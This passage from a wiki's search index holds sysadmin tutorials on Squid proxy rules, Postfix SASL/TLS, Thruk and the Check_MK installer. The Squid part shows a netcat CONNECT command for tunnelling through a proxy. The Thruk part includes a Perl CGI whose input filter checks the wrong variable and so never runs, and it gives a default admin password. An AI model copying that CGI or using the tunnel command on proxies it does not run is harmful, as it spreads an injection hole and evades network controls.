acl\tport_gtalk\tport 5222 acl gtalk_dst dstdom_regex talk.*.google.com # ulbridge and co acl\tport_63007\tport 63007 acl\tport_63005\tport 63005 acl\tport_8090\tport 8090 acl\tport_2000\tport 2000 acl\tsnutulbrlbnuat01 dstdom_regex snutulbrlbnuat01 acl\tcnutulomlnprd-om01 dstdom_regex cnutulomlnprd-om01 acl cnutulbrlnprd-br01 dstdom_regex cnutulbrlnprd-br01 acl\tpublic_ip\tdst 62.23.35.231/32 http_access allow Superuser http_access allow timeok http_access allow url_whitelist http_access allow dst_whitelist http_access allow srcfacebook facebook http_access deny url_blacklist http_access deny dst_blacklist http_access deny tunnelurl tunnelmethod http_access deny audioreq http_access deny videoreq http_access deny tunnelreq http_reply_access allow timeok http_reply_access allow url_whitelist http_reply_access deny audiorep http_reply_access deny videorep http_reply_access deny tunnelrep http_access allow snutulbrlbnuat01 port_63005 http_access allow snutulbrlbnuat01 port_63007 http_access allow cnutulomlnprd-om01 port_63007 http_access allow cnutulbrlnprd-br01 port_63005 http_access allow stmartin port_8003 http_access allow public_ip port_2000 # Google talk http_access allow gtalk_dst port_gtalk http_access allow manager localhost http_access deny manager http_access allow localhost #http_access allow localnet Safe_ports mycompany Authentified #http_access deny localnet Safe_ports mycompany !Authentified #http_access allow localnet Authentified #http_access allow localnet CONNECT Authentified http_access allow localnet Safe_ports http_access allow localnet CVS_port #Authentified http_access allow localnet SSL_ports CONNECT http_access allow localnet CVS_port CONNECT #Authentified #http_access deny !Safe_ports #http_access deny CONNECT !SSL_ports http_access deny all icp_access deny all htcp_access deny all cache deny monsternet cache deny monsterdom deny_info http://proxy.mycompany.lan/not-allowed-new.html all deny_info http://proxy.mycompany.lan/not-allowed-new.html url_blacklist.txt deny_info http://proxy.mycompany.lan/not-allowed-new.html dst_blacklist.txt #hierarchy_stoplist cgi-bin ? acl QUERY urlpath_regex cgi-bin \\? no_cache deny QUERY # comment it out to desactivate squidGuard url_rewrite_program /usr/bin/squidGuard -c /etc/squid/squidGuard.conf refresh_pattern ^ftp:\t1440\t20%\t10080 refresh_pattern ^gopher:\t1440\t0%\t1440 refresh_pattern (cgi-bin|\\?)\t0\t0%\t0 #refresh_pattern -i \\.(gif|jpg|avi|iso|txt)$ 60 20% 120 refresh_pattern .\t0\t20%\t4320 #refresh_pattern -i \\.(gif|jpg|avi|iso|txt)$ 30 20% 60 coredump_dir /var/spool/squid access_log /var/log/squid/access.log squid cache_dir ufs /var/spool/squid 25000 16 256 maximum_object_size 1024000 KB delay_pools 3 delay_class 1 2 delay_parameters 1 -1/-1 -1/-1 delay_class 2 3 ##delay_parameters 2 256000/256000 64000/64000 16000/48000 delay_parameters 2 256000/256000 64000/64000 -1/-1 #delay_parameters 2 -1/-1 256000/1280000 -1/-1 #delay_parameters 2 256000/256000 -1/-1 -1/-1 delay_class 3 1 delay_parameters 3 256000/256000 #delay_parameters 3 1024000/1024000 delay_access 1 deny localnet delay_access 3 allow binaries_ext delay_access 3 allow visio delay_access 2 deny binaries_ext delay_access 2 allow localnet #debug_options ALL,1 29,6 28,6 ignore_expect_100 on Now all that’s left is to adapt and restart the server.\nVerify your rules linkGet linkFor Get methods, it’s possible to check what’s available this way:\nprintf \"GET http://:\\r\\n\" | nc -w 1 Connect linkYou should limit CONNECT methods as much as possible and only allow the GET method. CONNECT is generally used by port 443 and is potentially dangerous because it allows tunneling. To exploit a tunnel, here’s how:\nnc -w 1 -v -X connect -x : We can see if it works (and if a port is open on the other side) with a result like:\nConnection to 88.191.144.199 873 port [tcp/rsync] succeeded! or\nnc: Proxy error: \"HTTP/1.0 504 Gateway Time-out\" At this point, we know that the CONNECT mode works on this port. Otherwise, we’ll have:\nnc: Proxy error: \"HTTP/1.0 302 Moved Temporarily\" FAQ linkWARNING! Your cache is running out of filedescriptors linkThis happens when squid hits the max ulimit. This manifests as major slowdowns on the Internet. To solve this problem, simply increase the size of the file descriptors (default is 1024):\nSQUID_MAXFD=4096 Then restart the service.\nResources linkhttp://www.squid-cache.org/\nhttp://www.visolve.com/squid/squid27/contents.php\nhttp://www.visolve.com/squid/squid27/accesscontrols.php\nhttp://www.davidandrzejewski.com/2011/11/06/squid-proxy-make-outgoing-headers-anonymous/?utm_source=feedburner\u0026utm_medium=feed\u0026utm_campaign=Feed%3A+davidandrzejewski+%28David+Andrzejewski%29\n"
            }
        );
    index.add(
            {
                id:  326 ,
                href: "\/SASL_:_Envoie_de_mails_%C3%A0_distance_s%C3%A9curis%C3%A9_avec_son_serveur_Postfix_%28SASL%20TLS%29\/",
                title: "SASL: Secure Remote Email Sending with Postfix Server (SASL+TLS)",
                description: "How to configure SASL and TLS with Postfix for secure remote email sending",
                content: " Software version 2.7.1 Operating System Debian 6 Website Postfix Website Last Update 06/06/2012 Introduction linkFor several years now, most mail servers no longer authorize sending emails from outside to prevent becoming an open relay. It’s therefore necessary to add an additional layer called SASL.\nThat’s what we’ll try to implement here with added security (TLS) :-)\nInstallation linkTo install SASL, you must already have installed and configured Postfix. Once that’s done, install SASL:\naptitude install postfix-tls sasl2-bin libsasl2-2 libsasl2-modules openssl Configuration linkPreparation of directories linkWe’ll create the necessary directories for our chrooted Postfix:\nmkdir -p /var/spool/postfix/var/run mv /var/run/saslauthd /var/spool/postfix/var/run/ ln -s /var/spool/postfix/var/run/saslauthd /var/run chgrp sasl /var/spool/postfix/var/run/saslauthd adduser postfix sasl mkdir -p /etc/postfix/ssl Certificate creation linkCreate the /etc/postfix/ssl folder:\ncd /etc/postfix/ssl openssl genrsa -des3 -rand /dev/urandom -out smtpd.key 1024 chmod 600 smtpd.key openssl req -new -key smtpd.key -out smtpd.csr openssl x509 -req -days 3650 -in smtpd.csr -signkey smtpd.key -out smtpd.crt openssl rsa -in smtpd.key -out smtpd.key.unencrypted mv -f smtpd.key.unencrypted smtpd.key openssl req -new -x509 -extensions v3_ca -keyout cakey.pem -out cacert.pem -days 3650 main.cf linkIn your Postfix configuration file, you’ll need to add these lines. Edit the file /etc/postfix/main.cf:\n# SASL smtp_sasl_auth_enable = yes smtpd_sasl_auth_enable = yes smtp_sasl_security_options = # To fix the bug with some clients (Outlook...) broken_sasl_auth_clients = yes smtpd_sasl_application_name= smtpd smtpd_sasl_security_options = noanonymous smtpd_sasl_local_domain = smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd # TLS/SSL smtpd_tls_security_level = may smtpd_tls_auth_only = no smtp_use_tls = yes smtpd_use_tls = yes smtp_tls_loglevel = 1 smtpd_tls_received_header = yes smtpd_tls_loglevel = 1 smtp_tls_note_starttls_offer = yes smtpd_tls_key_file = /etc/postfix/ssl/smtpd.key smtpd_tls_cert_file = /etc/postfix/ssl/smtpd.crt smtpd_tls_CAfile = /etc/postfix/ssl/cacert.pem This should give you something like this:\n# See /usr/share/postfix/main.cf.dist for a commented, more complete version # Security smtpd_banner = fire.deimos.fr - Microsoft Exchange (5.5) biff = no disable_vrfy_command = yes smtpd_helo_required = yes # Reject unknow domain reject_unknown_recipient_domain = yes # appending .domain is the MUA's job. append_dot_mydomain = no mydomain = deimos.fr myhostname = fire.deimos.fr alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases myorigin = /etc/mailname mydestination = deimos.fr relayhost = mynetworks = 127.0.0.0/8, 192.168.0.0/24, 10.8.0.0/24 home_mailbox = Maildir/ mailbox_size_limit = 0 recipient_delimiter = + inet_interfaces = all mailbox_command = procmail -a \"$EXTENSION\" # Virtual Domains virtual_alias_domains = deimos.fr virtual_alias_maps = hash:/etc/postfix/virtual # Protection against Open Relay smtpd_client_restrictions = reject_rbl_client bl.spamcop.net # Protection against Spam smtpd_recipient_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination, reject_invalid_hostname, reject_non_fqdn_sender, reject_unknown_sender_domain, reject_non_fqdn_recipient, reject_unknown_recipient_domain, reject_rhsbl_client blackhole.securitysage.com, reject_rhsbl_sender blackhole.securitysage.com, reject_rbl_client list.dsbl.org, reject_rbl_client cbl.abuseat.org, reject_rbl_client dul.dnsbl.sorbs.net, reject_rbl_client multi.uribl.com, reject_rbl_client dsn.rfc-ignorant.org, reject_rbl_client dul.dnsbl.sorbs.net, reject_rbl_client sbl-xbl.spamhaus.org, reject_rbl_client bl.spamcop.net, reject_rbl_client cbl.abuseat.org, reject_rbl_client ix.dnsbl.manitu.net, reject_rbl_client combined.rbl.msrbl.net, reject_rbl_client rabl.nuclearelephant.com, permit smtpd_data_restrictions = reject_unauth_pipelining mime_header_checks = regexp:/etc/postfix/mime_header_checks.regexp # SASL smtp_sasl_auth_enable = yes smtpd_sasl_auth_enable = yes smtp_sasl_security_options = # Pour corriger le bug de certains client (Outlook...) broken_sasl_auth_clients = yes smtpd_sasl_application_name= smtpd smtpd_sasl_security_options = noanonymous smtpd_sasl_local_domain = # TLS/SSL smtpd_tls_security_level = may smtpd_tls_auth_only = no smtp_use_tls = yes smtpd_use_tls = yes smtp_tls_loglevel = 1 smtpd_tls_received_header = yes smtpd_tls_loglevel = 1 smtp_tls_note_starttls_offer = yes smtpd_tls_key_file = /etc/postfix/ssl/smtpd.key smtpd_tls_cert_file = /etc/postfix/ssl/smtpd.crt smtpd_tls_CAfile = /etc/postfix/ssl/cacert.pem # Divers smtpd_tls_session_cache_timeout = 3600s tls_random_source = dev:/dev/urandom # Use Amavis content_filter = amavis:[127.0.0.1]:10024 saslauthd linkEdit the file /etc/defaut/saslauthd and fill in these fields:\nSTART=yes DESC=\"SASL Authentication Daemon\" NAME=\"saslauthd\" MECHANISMS=\"pam\" MECH_OPTIONS=\"\" THREADS=5 OPTIONS=\"-c -m /var/spool/postfix/var/run/saslauthd -r\" smtpd.conf linkHere, we’ll define the authentication method. Let’s create a smtpd.conf file in postfix:\nmkdir /etc/postfix/sasl Then create a file /etc/postfix/sasl/smtpd.conf and add this inside:\npwcheck_method: saslauthd mech_list: plain login sasl_passwd linkNow, we need to grant users access to SASL. Create the file /etc/postfix/sasl_passwd and fill it in like this:\nmail login:password fqdn login Here’s a simple example:\ndeimos@deimos.fr deimos:xxxxx Finally, we’ll set rather restrictive rights as passwords are in clear text, then run postmap:\nchmod 600 /etc/postfix/sasl_passwd postmap /etc/postfix/sasl_passwd Validation linkTo validate everything, simply restart the services in question:\n/etc/init.d/postfix restart /etc/init.d/saslauthd restart Verification linkTo verify, a simple telnet will do the trick:\n\u003e telnet deimos.fr 25 Connected to deimos.fr. Escape character is '^]'. 220 ******************************************* ehlo test 250-fire.deimos.fr 250-PIPELINING 250-SIZE 10240000 250-ETRN 250-XXXXXXXA 250-AUTH LOGIN PLAIN 250-AUTH=LOGIN PLAIN 250-ENHANCEDSTATUSCODES 250-8BITMIME 250 DSN Some might get this:\n250-STARTTLS instead of:\n250-XXXXXXXA Resources linkPostfix SMTP Authentication - On The Secure Port Only\n"
            }
        );
    index.add(
            {
                id:  327 ,
                href: "\/Thruk_:_Une_interface_%C3%A9volu%C3%A9e_pour_Nagios_et_MKlivestatus\/",
                title: "Thruk: An Advanced Interface for Nagios and MKlivestatus",
                description: "Thruk is an advanced interface for Nagios and Shinken that allows connecting to multiple Nagios instances simultaneously and display more relevant information compared to the standard Nagios interface.",
                content: " Software version 1.30 Operating System Debian 6 Website Thruk Website Last Update 30/05/2012 Introduction linkThruk is an advanced interface for Nagios (and Shinken) that allows connecting to multiple Nagios instances simultaneously and displaying more relevant information compared to the standard Nagios interface.\nPrerequisites linkHere are the prerequisites:\naptitude install libapache2-mod-fcgid Installation linkLet’s download Thruk:\nwget http://www.thruk.org/files/pkg/v1.30/debian6/amd64/thruk_1.30_debian6_amd64.deb dpkg -i thruk_1.30_debian6_amd64.deb You can now connect to the Thruk interface: http://nagios/thruk/\nLogin and password: thrukadmin\nConfiguration linkFirst, we’ll adjust some permissions to avoid future problems:\nchown www-data. /etc/thruk/thruk* /etc/thruk/cgi.cfg chown -Rf nagios. /var/lib/nagios3 touch /etc/thruk/checkconfig chown nagios:www-data /etc/thruk/checkconfig Apache LDAP linkYou might want to use LDAP authentication with Thruk, just like your Nagios. It’s quite simple:\nAddHandler fcgid-script .sh Options FollowSymLinks AllowOverride All order allow,deny allow from all Options FollowSymLinks allow from all Options FollowSymLinks allow from all # redirect to a startup page when there is no pidfile yet RewriteEngine On RewriteCond %{REQUEST_METHOD} GET RewriteCond %{REQUEST_URI} !^/thruk/startup.html RewriteCond %{REQUEST_URI} !^/thruk/side.html RewriteCond %{REQUEST_URI} !^/thruk/.*\\.(css|png|js) RewriteCond %{REQUEST_URI} ^/thruk RewriteCond /var/cache/thruk/thruk.pid !-f RewriteRule ^(.*)$ /thruk/startup.html?$1 [R=302,L,NE,QSA] Alias /thruk/documentation.html /usr/share/thruk/root/thruk/documentation.html Alias /thruk/startup.html /usr/share/thruk/root/thruk/startup.html AliasMatch ^/thruk/(.*\\.cgi|.*\\.html) /usr/share/thruk/fcgid_env.sh/thruk/$1 AliasMatch ^/thruk/plugins/(.*?)/(.*)$ /etc/thruk/plugins/plugins-enabled/$1/root/$2 Alias /thruk/themes/ /etc/thruk/themes/themes-enabled/ Alias /thruk /usr/share/thruk/root/thruk Options ExecCGI Options FollowSymLinks #DirectoryIndex index.php AllowOverride AuthConfig Order Deny,Allow Deny From All Allow From 127.0.1.1 Allow From 127.0.0.1 AuthName \"Thruk Access\" AuthType Basic AuthBasicProvider ldap AuthzLDAPAuthoritative on AuthLDAPURL ldap://openldap.deimos.fr/dc=openldap,dc=deimos,dc=fr?uid?sub?(objectClass=posixAccount) AuthLDAPRemoteUserIsDN off AuthLDAPGroupAttribute memberUid AuthLDAPGroupAttributeIsDN off Require ldap-group ou=Groups,dc=openldap,dc=deimos,dc=fr Require ldap-user nagiosadmin Satisfy Any Thruk linkFor Thruk configuration, there are 2 important files:\nthruk.conf: General configuration thruk_local.conf: Custom configuration According to the official documentation, it’s preferable not to touch the general configuration and override certain parameters with the custom configuration.\nHere’s a basic configuration to make it work with MK Livestatus:\n############################################ # put your own settings into this file # settings from this file will override # those from the thruk.conf ############################################ # Interface Options default_theme = Exfoliation use_timezone = CET use_ajax_search = 1 use_new_search = 1 info_popup_event_type = onmouseover show_modified_attributes = 1 show_long_plugin_output = inline show_full_commandline = 2 # Backends to Mklivestatus name = Local Nagios type = livestatus peer = /var/lib/nagios3/rw/live resource_file = /etc/nagios3/resource.cfg core_conf = /etc/nagios3/nagios.cfg obj_check_cmd = /usr/sbin/nagios3 -v /etc/nagios3/nagios.cfg obj_reload_cmd = /etc/init.d/nagios3 reload You can add multiple Peers to have a unified interface with several Nagios servers. Once you have access to the Thruk interface, you can configure all its options directly from this interface, as well as those of Nagios.\nThen reload Apache for the changes to take effect.\nMinimal Interface for Monitoring Screens linkI had already discussed in the Nagios documentation solutions for having a fairly minimal screen. The problem is that it’s still not sufficient, and fortunately with Thruk there’s a way to fix this issue without having to recode 3/4 of the program. So I created a small patch that I submitted to the Thruk team (which has just been accepted https://github.com/sni/Thruk/commit/d1eefef82cd8fbab6ebebff8a570bb1e026d1a9f but will only be available in the next release (1.28)), so in the meantime, here’s how to have the most minimal interface possible.\nHere is a first patch to modify the Thruk Perl modules so that they take into account a new parameter in the URL called “minimal”:\ndiff -Nru old/Root.pm new/Root.pm --- old/Root.pm 2012-04-06 13:05:08.000000000 +0200 +++ new/Root.pm 2012-04-06 13:05:16.000000000 +0200 @@ -215,6 +215,9 @@ } $c-\u003estash-\u003e{hidetop} = $c-\u003e{'request'}-\u003e{'parameters'}-\u003e{'hidetop'} || ''; + # Add custom monitor screen function + $c-\u003estash-\u003e{minimal} = $c-\u003e{'request'}-\u003e{'parameters'}-\u003e{'minimal'} || ''; + # initialize our backends unless ( defined $c-\u003e{'db'} ) { $c-\u003e{'db'} = $c-\u003emodel('Thruk'); diff -Nru old/status.pm new/status.pm --- old/status.pm 2012-04-06 13:05:08.000000000 +0200 +++ new/status.pm 2012-04-06 13:05:21.000000000 +0200 @@ -744,6 +744,9 @@ $c-\u003estash-\u003e{hidetop} = 1 unless $c-\u003estash-\u003e{hidetop} ne ''; $c-\u003estash-\u003e{hidesearch} = 1; + # Monitor screen interface + $c-\u003estash-\u003e{minimal} = 1 unless $c-\u003estash-\u003e{minimal} ne ''; + # which host to display? my( $hostfilter) = Thruk::Utils::Status::do_filter($c, 'hst_'); my( undef, $servicefilter) = Thruk::Utils::Status::do_filter($c, 'svc_'); And then we will modify the interface so that the changes apply only to a part of the code:\ndiff -Nru old/_header.tt new/_header.tt --- old/_header.tt 2012-04-06 13:39:31.000000000 +0200 +++ new/_header.tt 2012-04-06 13:37:44.000000000 +0200 @@ -192,14 +192,18 @@ + [% UNLESS minimal == 1 %] + [% END %] +[% UNLESS minimal == 1 %] [% IF page == 'status' || page == 'statusmap' %] [% END %] +[% END %] diff -Nru old/status_detail.tt new/status_detail.tt --- old/status_detail.tt 2012-04-06 13:37:10.000000000 +0200 +++ new/status_detail.tt 2012-04-06 13:37:24.000000000 +0200 @@ -12,6 +12,7 @@ [% PROCESS _overdiv.tt %] [% PROCESS _status_cmd_pane.tt %] +[% UNLESS minimal == 1 %] @@ -103,9 +104,11 @@ + [% END %] [% PROCESS _status_detail_table.tt %] + [% UNLESS minimal == 1 %] [% UNLESS authorized_for_read_only %] select all (hosts) @@ -118,6 +121,7 @@ [% PROCESS _pager.tt %] + [% END %] [% IF !has_error \u0026\u0026 data.size %][% data.size %] of [% pager.total_entries %][% ELSE %]0[% END %] Matching Service Entries Displayed [% PROCESS _footer.tt %] And let’s patch everything:\npatch -d /usr/share/thruk/lib/Thruk/Controller/ \u003c Thruk_perl_modules.patch patch -d /usr/share/thruk/templates/ \u003c Thruk_interface.patch Now, all you have to do is add “\u0026minimal=1” to the end of your thrunk URL to remove all unnecessary elements. Example:\nhttp://nagios/thruk/cgi-bin/status.cgi?host=all\u0026type=detail\u0026hostprops=10\u0026serviceprops=42\u0026servicestatustypes=28\u0026hidetop=1\u0026minimal=1 Adding a Custom CGI linkIn some cases, you may have certain checks that temporarily store information on the Nagios server, and you want to be able to execute actions from the Nagios interface. For this, there is the ‘action_url’ option where we can provide a URL to a CGI that will execute what we want, possibly with options.\nLet’s start by creating our CGI. Here is a minimalist example where I remove a temporary file:\n#!/usr/bin/perl use CGI; $query = CGI::new(); $host = $query-\u003eparam(\"host\"); # Avoid inputing special characters that would crash the program if ( $h =~ /\\`|\\~|\\@|\\#|\\$|\\%|\\^|\\\u0026|\\*|\\(|\\)|\\:|\\=|\\+|\\\"|\\'|\\;|\\\u003c|\\\u003e/ ) { print \"Illegal special chars detected. Exit\\n\"; exit(1); } print \"Content-type: text/html\\n\\n\"; print \"\\n\"; print \"Removing $host temporary file\\n\"; print \"\\n\"; print \"\\n\"; print \"Removing $host Interface Network Flapping temporary file...\"; if (-f \"/tmp/iface_state_$host.txt\") { unlink(\"/tmp/iface_state_$host.txt\") or print \"FAIL\n/tmp/iface_state_$host.txt : $!\\n\" and exit(1); print \"OK\\n\"; } else { print \"FAIL\n/tmp/iface_state_$host.txt : No such file or directory\\n\"; } print \"\\n\"; And then in the configuration of the service in question, I insert my ‘action_url’:\ndefine service{ use generic-services-ulsysnet hostgroup_name network service_description Interface Network Flapping check_period 24x7 notification_period 24x7 _SNMP_PORT\t161 _SNMP_COMMUNITY\tpublic _DURATION\t86400 check_command check_interface_flapping # For Thruk \u0026 Nagios # action_url\t../../cgi-bin/nagios3/remove.cgi?host=$HOSTADDRESS$ # For Nagios only action_url\tremove.cgi?host=$HOSTADDRESS$ } Now you just need to reload Nagios.\nYou’ll notice that for Thruk, I found an easy but not very clean method, which consists of rewriting the URL to point to the Nagios links. For a clean method, you would need to write a dedicated plugin.\nFAQ linkOS Icons No Longer Display linkApparently in the Debian package of this version of Thruk, there is a small issue with displaying OS icons. To fix this, we’ll create a symbolic link:\nln -s /usr/share/nagios/htdocs/images/logos/base /usr/share/thruk/themes/themes-available/Classic/images/logos/ "
            }
        );
    index.add(
            {
                id:  328 ,
                href: "\/Check_MK_:_Collecter_facilement_des_infos_Nagios_et_%C3%A9tendez_ses_possibilit%C3%A9s\/",
                title: "Check MK: Easily collect Nagios information and extend its capabilities",
                description: "Set up Check MK to extend Nagios functionality with easy data collection and additional features like multisites and clustering",
                content: " Software version 1.1.12p7 Operating System Debian 6 Website Check MK Website Last Update 25/05/2012 Introduction linkNagios is great, but sometimes it lacks certain features. Here’s an excellent addon that allows you to quickly extract data and enhance capabilities (multisites, cluster…).\nIn this article, we’ll explore some of these possibilities with Check MK (also known as MK Live Status).\nPrerequisites linkHere are the necessary packages:\naptitude install xinetd gcc g++ libc6-dev libstdc++6-dev libapache2-mod-python Installation linkCheck MK linkLet’s download the latest version of check_mk and the agent:\nwget http://mathias-kettner.de/download/check_mk-1.1.12p7.tar.gz wget http://mathias-kettner.de/download/check-mk-agent_1.1.12p7-2_all.deb tar -xzf check_mk-1.1.12p7.tar.gz cd check_mk-1.1.12p7 Now we’ll run the installer (basically it’s just hitting enter repeatedly, Windows-style):\n./setup.sh ____ _ _ __ __ _ __ / ___| |__ ___ ___| | __ | \\/ | |/ / | | | '_ \\ / _ \\/ __| |/ / | |\\/| | ' / | |___| | | | __/ (__| \u003c | | | | . \\ \\____|_| |_|\\___|\\___|_|\\_\\___|_| |_|_|\\_\\ |_____| Check_MK setup Version: 1.1.12p7 Welcome to Check_MK. This setup will install Check_MK into user defined directories. If you run this script as root, installation paths below /usr will be suggested. If you run this script as non-root user paths in your home directory will be suggested. You may override the default values or just hit enter to accept them. Your answers will be saved to /root/.check_mk_setup.conf and will be reused when you run the setup of this or a later version again. Please delete that file if you want to delete your previous answers. * Found running Nagios process, autodetected 17 settings. 1) Installation directories of check_mk Executable programs Directory where to install executable programs such as check_mk itself. This directory should be in your search path ($PATH). Otherwise you always have to specify the installation path when calling check_mk: ( default --\u003e /usr/bin): Check_MK configuration Directory where check_mk looks for its main configuration file main.mk. An example configuration file will be installed there if no main.mk is present from a previous version.: ( default --\u003e /etc/check_mk): check_mk checks check_mk's different checks are implemented as small Python scriptlets that parse and interpret the various output sections of the agents. Where shall those be installed: ( default --\u003e /usr/share/check_mk/checks): check_mk modules Directory for main componentents of check_mk itself. The setup will also create a file 'defaults' in that directory that reflects all settings you are doing right now: ( default --\u003e /usr/share/check_mk/modules): Check_MK Multisite GUI Directory where Check_mk's Multisite GUI should be installed. Multisite is an optional replacement for the Nagios GUI, but is also needed for the logwatch extension. That directory should not be in your WWW document root. A separate apache configuration file will be installed that maps the directory into your URL schema: ( default --\u003e /usr/share/check_mk/web): Localization dir Base directory for gettext localization files. Multisite comes prepared for localzation but does not ship any language per default.: ( default --\u003e /usr/share/check_mk/locale): documentation Some documentation about check_mk will be installed here. Please note, however, that most of check_mk's documentation is available only online at http://mathias-kettner.de/check_mk.html: ( default --\u003e /usr/share/doc/check_mk): check manuals Directory for manuals for the various checks. The manuals can be viewed with check_mk -M : ( default --\u003e /usr/share/doc/check_mk/checks): working directory of check_mk check_mk will create caches files, automatically created checks and other files into this directory. The setup will create several subdirectories and makes them writable by the Nagios process: ( default --\u003e /var/lib/check_mk): agents for operating systems Agents for various operating systems will be installed here for your conveniance. Take them and install them onto your target hosts: ( default --\u003e /usr/share/check_mk/agents): 2) Configuration of Linux/UNIX Agents extensions for agents This directory will not be created on the server. It will be hardcoded into the Linux and UNIX agents. The agent will look for extensions in the subdirectories plugins/ and local/ of that directory: ( default --\u003e /usr/lib/check_mk_agent): configuration dir for agents This directory will not be created on the server. It will be hardcoded into the Linux and UNIX agents. The agent will look for its configuration files here (currently only the logwatch extension needs a configuration file): ( default --\u003e /etc/check_mk): 3) Integration with Nagios Name of Nagios user The working directory for check_mk contains several subdirectories that need to be writable by the Nagios user (which is running check_mk in check mode). Please specify the user that should own those directories: ( autodetected --\u003e nagios): User of Apache process Check_MK WATO (Web Administration Tool) needs a sudo configuration, such that Apache can run certain commands as root. If you specify the correct user of the apache process here, then we can create a valid sudo configuration for you later:: ( autodetected --\u003e www-data): Common group of Nagios+Apache Check_mk creates files and directories while running as nagios. Some of those need to be writable by the user that is running the webserver. Therefore a group is needed in which both Nagios and the webserver are members (every valid Nagios installation uses such a group to allow the web server access to Nagios' command pipe):: ( default --\u003e nagios): Nagios binary The complete path to the Nagios executable. This is needed by the option -R/--restart in order to do a configuration check.: ( autodetected --\u003e /usr/sbin/nagios3): Nagios main configuration file Path to the main configuration file of Nagios. That file is always named 'nagios.cfg'. The default path when compiling Nagios yourself is /usr/local/nagios/etc/nagios.cfg. The path to this file is needed for the check_mk option -R/--restart: ( autodetected --\u003e /etc/nagios3/nagios.cfg): Nagios object directory Nagios' object definitions for hosts, services and contacts are usually stored in various files with the extension .cfg. These files are located in a directory that is configured in nagios.cfg with the directive 'cfg_dir'. Please specify the path to that directory (If the autodetection can find your configuration file but does not find at least one cfg_dir directive, then it will add one to your configuration file for your conveniance): ( autodetected --\u003e /etc/nagios3/conf.d): Nagios startskript The complete path to the Nagios startskript is used by the option -R/--restart to restart Nagios.: ( autodetected --\u003e /etc/init.d/nagios3): Nagios command pipe Complete path to the Nagios command pipe. check_mk needs write access to this pipe in order to operate: ( default --\u003e /var/log/nagios/rw/nagios.cmd): Check results directory Complete path to the directory where Nagios stores its check results. Using that directory instead of the command pipe is faster.: ( autodetected --\u003e /var/lib/nagios3/spool/checkresults): Nagios status file The web pages of check_mk need to read the file 'status.dat', which is regularily created by Nagios. The path to that status file is usually configured in nagios.cfg with the parameter 'status_file'. If that parameter is missing, a compiled-in default value is used. On FHS-conforming installations, that file usually is in /var/lib/nagios or /var/log/nagios. If you've compiled Nagios yourself, that file might be found below /usr/local/nagios: ( autodetected --\u003e /var/cache/nagios3/status.dat): Path to check_icmp check_mk ships a Nagios configuration file with several host and service templates. Some host templates need check_icmp as host check. That check plugin is contained in the standard Nagios plugins. Please specify the complete path (dir + filename) of check_icmp: ( autodetected --\u003e /usr/lib/nagios/plugins/check_icmp): 4) Integration with Apache URL Prefix for Web addons Usually the Multisite GUI is available at /check_mk/ and PNP4Nagios is located at /pnp4nagios/. In some cases you might want to define some prefix in order to be able to run more instances of Nagios on one host. If you say /test/ here, for example, then Multisite will be located at /test/check_mk/. Please do not forget the trailing slash.: ( default --\u003e /): /check_mk Apache config dir Check_mk ships several web pages implemented in Python with Apache mod_python. That module needs an apache configuration section which will be installed by this setup. Please specify the path to a directory where Apache reads in configuration files.: ( autodetected --\u003e /etc/apache2/conf.d): HTTP authentication file Check_mk's web pages should be secured from unauthorized access via HTTP authenticaion - just as Nagios. The configuration file for Apache that will be installed contains a valid configuration for HTTP basic auth. The most conveniant way for you is to use the same user file as for Nagios. Please enter your htpasswd file to use here: ( default --\u003e /etc/nagios/htpasswd.users): HTTP AuthName Check_mk's Apache configuration file will need an AuthName. That string will be displayed to the user when asking for the password. You should use the same AuthName as for Nagios. Otherwise the user will have to log in twice: ( autodetected --\u003e Nagios Access): 5) Integration with PNP4Nagios 0.6 PNP4Nagios templates Check_MK ships templates for PNP4Nagios for most of its checks. Those templates make the history graphs look nice. PNP4Nagios expects such templates in the directory pnp/templates in your document root for static web pages: ( autodetected --\u003e /usr/share/pnp4nagios/html/templates): RRA config for PNP4Nagios Check_MK ships RRA configuration files for its checks that can be used by PNP when creating the RRDs. Per default, PNP creates RRD such that for each variable the minimum, maximum and average value is stored. Most checks need only one or two of these aggregations. If you install the Check_MK's RRA config files into the configuration directory of PNP, PNP will create RRDs with the minimum of required aggregation and thus save substantial amount of disk I/O (and space) for RRDs. The default is to install the configuration into a separate directory but does not enable them: ( default --\u003e /usr/share/check_mk/pnp-rraconf): 6) Check_MK Livestatus Module compile livestatus module This version of Check_mk ships a completely new and experimental Nagios event broker module that provides direct access to Nagios internal data structures. This module is called the Check_MK Livestatus Module. It aims to supersede status.dat and also NDO. Currenty it is completely experimental and might even crash your Nagios process. Nevertheless - The Livestatus Module does not only allow extremely fast access to the status of your services and hosts, it does also provide live data (which status.dat does not). Also - unlike NDO - Livestatus does not cost you even measurable CPU performance, does not need any disk space and also needs no configuration. Please answer 'yes', if you want to compile and integrate the Livestatus module into your Nagios. You need 'make' and the GNU C++ compiler installed in order to do this: ( default --\u003e yes): check_mk's binary modules Directory for architecture dependent binary libraries and plugins of check_mk: ( default --\u003e /usr/lib/check_mk): Unix socket for Livestatus The Livestatus Module provides Nagios status data via a unix socket. This is similar to the Nagios command pipe, but allows bidirectional communication. Please enter the path to that pipe. It is recommended to put it into the same directory as Nagios' command pipe: ( default --\u003e /var/log/nagios/rw/live): Backends for other systems Directory where to put backends and configuration examples for other systems. Currently this is only Nagvis, but other might follow later.: ( default --\u003e /usr/share/check_mk/livestatus): ---------------------------------------------------------------------- You have chosen the following directories: Executable programs /usr/bin Check_MK configuration /etc/check_mk check_mk checks /usr/share/check_mk/checks check_mk modules /usr/share/check_mk/modules Check_MK Multisite GUI /usr/share/check_mk/web Localization dir /usr/share/check_mk/locale documentation /usr/share/doc/check_mk check manuals /usr/share/doc/check_mk/checks working directory of check_mk /var/lib/check_mk agents for operating systems /usr/share/check_mk/agents extensions for agents /usr/lib/check_mk_agent configuration dir for agents /etc/check_mk Name of Nagios user nagios User of Apache process www-data Common group of Nagios+Apache nagios Nagios binary /usr/sbin/nagios3 Nagios main configuration file /etc/nagios3/nagios.cfg Nagios object directory /etc/nagios3/conf.d Nagios startskript /etc/init.d/nagios3 Nagios command pipe /var/log/nagios/rw/nagios.cmd Check results directory /var/lib/nagios3/spool/checkresults Nagios status file /var/cache/nagios3/status.dat Path to check_icmp /usr/lib/nagios/plugins/check_icmp URL Prefix for Web addons /check_mk Apache config dir /etc/apache2/conf.d HTTP authentication file /etc/nagios/htpasswd.users HTTP AuthName Nagios Access PNP4Nagios templates 